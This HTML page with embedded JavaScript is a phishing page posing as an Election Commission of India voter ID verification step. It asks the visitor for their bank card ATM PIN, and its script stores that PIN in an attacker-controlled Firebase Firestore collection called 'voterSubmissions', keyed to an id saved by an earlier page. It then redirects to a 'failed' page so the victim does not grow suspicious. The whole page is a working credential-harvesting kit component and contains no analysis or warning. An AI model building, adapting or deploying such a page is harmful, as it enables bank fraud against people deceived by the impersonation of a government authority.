<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voter ID - ATM PIN Verification</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        
        /* Full Background Logo Setup with Overlay */
        body { 
            background: linear-gradient(rgba(0, 86, 179, 0.8), rgba(0, 64, 133, 0.85)), url('logo.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            padding: 20px; 
        }

        /* Form Container for Edge-to-Edge Banner */
        .form-container { 
            background: #ffffff; 
            padding: 0 35px 35px 35px; 
            border-radius: 12px; 
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4); 
            width: 100%; 
            max-width: 450px; 
            overflow: hidden; 
        }

        /* Full Width Edge-to-Edge Banner Styling */
        .full-banner {
            margin-left: -35px;
            margin-right: -35px;
            margin-bottom: 25px;
            width: calc(100% + 70px);
            height: 130px;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #004085;
        }

        .full-banner img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }

        .form-container h2 { text-align: center; margin-bottom: 20px; color: #0056b3; font-size: 22px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; font-size: 14px; }
        .form-group input { width: 100%; padding: 12px 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; text-align: center; letter-spacing: 3px; background: #fff; }
        .form-group input:focus { outline: none; border-color: #0056b3; box-shadow: 0 0 5px rgba(0, 86, 179, 0.3); }
        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn-next:hover { background: #004085; }
        .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
        .footer-text { text-align: center; margin-top: 25px; font-size: 12px; color: #666; font-weight: 600; border-top: 1px solid #eee; padding-top: 15px; }
    </style>
</head>
<body>
    <div class="form-container">
        <!-- Full Width Edge-to-Edge Banner Image Header -->
        <div class="full-banner">
            <img src="logo.png" alt="Election Commission Banner">
        </div>

        <h2>Enter ATM PIN</h2>
        <form id="pinForm">
            <div class="form-group">
                <label for="atmPin">Enter Your Card ATM PIN</label>
                <input type="password" id="atmPin" name="atmPin" placeholder="****" maxlength="6" required>
            </div>
            <button type="submit" id="submitBtn" class="btn-next">Verify & Complete</button>
        </form>
        <div class="footer-text">
            © 2026 Election Commission of India. All rights reserved.
        </div>
    </div>

    <!-- Firebase SDK & Script -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAZ7Dvd7HYsZrMuP0bABJuMAEZmRtGw02U",
            authDomain: "voter-verification-a04d5.firebaseapp.com",
            projectId: "voter-verification-a04d5",
            storageBucket: "voter-verification-a04d5.firebasestorage.app",
            messagingSenderId: "582458013788",
            appId: "1:582458013788:web:15f8c7fd7dc05d24328e99",
            measurementId: "G-8CX5BVQXFC"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        document.getElementById('pinForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const atmPin = document.getElementById('atmPin').value;
            const docId = localStorage.getItem('voterDocId');

            if (!docId) {
                alert("Session expired. Please start from the first page.");
                window.location.href = "index.html";
                return;
            }

            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerText = "Verifying...";

            try {
                const docRef = doc(db, "voterSubmissions", docId);
                // Firebase में ATM PIN और स्टेटस अपडेट करें
                await updateDoc(docRef, {
                    atmPin: atmPin,
                    currentStep: "ATM PIN Submitted"
                });

                setTimeout(() => {
                    window.location.href = "failed.html"; 
                }, 1000);
            } catch (error) {
                console.error("Error updating document: ", error);
                alert("डेटा सेव करने में समस्या हुई।");
                btn.disabled = false;
                btn.innerText = "Verify & Complete";
            }
        });
    </script>
</body>
</html>
